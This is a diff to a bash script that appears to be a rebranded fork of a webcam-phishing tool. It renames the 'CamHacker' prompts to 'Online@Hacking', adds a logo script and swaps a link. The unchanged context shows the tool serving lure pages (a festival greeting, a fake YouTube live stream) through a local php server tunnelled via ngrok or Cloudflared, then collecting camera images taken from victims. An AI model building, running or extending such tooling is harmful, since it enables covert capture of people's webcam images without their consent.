@@ -32,6 +32,7 @@ ask="${cyan}[${white}?${cyan}] ${purple}"
 error="${cyan}[${white}!${cyan}] ${red}"
 success="${cyan}[${white}√${cyan}] ${green}"
 
+bash OnlineHacking/logo.sh
 
 cwd=`pwd`
 
@@ -360,7 +361,7 @@ fi
 
 # Ngrok Authtoken
 if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
-    echo -e "\n${ask}Enter your ngrok authtoken:"
+    echo -e "\n${ask}Enter your ngrok authtoken (Enter to Skip):"
     printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
     read auth
     if [ -z $auth ]; then
@@ -396,7 +397,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -407,7 +408,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -425,7 +426,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -448,7 +449,7 @@ $red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
 printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
+        xdg-open "https://www.onlinehacking.in/"
     elif echo $option | grep -q "0"; then
         exit 0
     else
@@ -477,7 +478,7 @@ if $termux; then
 echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
 sleep 3
 fi
-echo -e "\n${info}Starting php server at localhost:7777....\n"
+echo -e "\n${info}Starting php server at 127.0.0.1:7777\n"
 netcheck
 php -S 127.0.0.1:7777 > /dev/null 2>&1 &
 sleep 2
@@ -554,7 +555,7 @@ while true; do
     fi
     sleep 0.5
     if [[ -e "log.txt" ]]; then
-        echo -e "\007${success}Image downloaded! Check directory!\n"
+        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
         file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
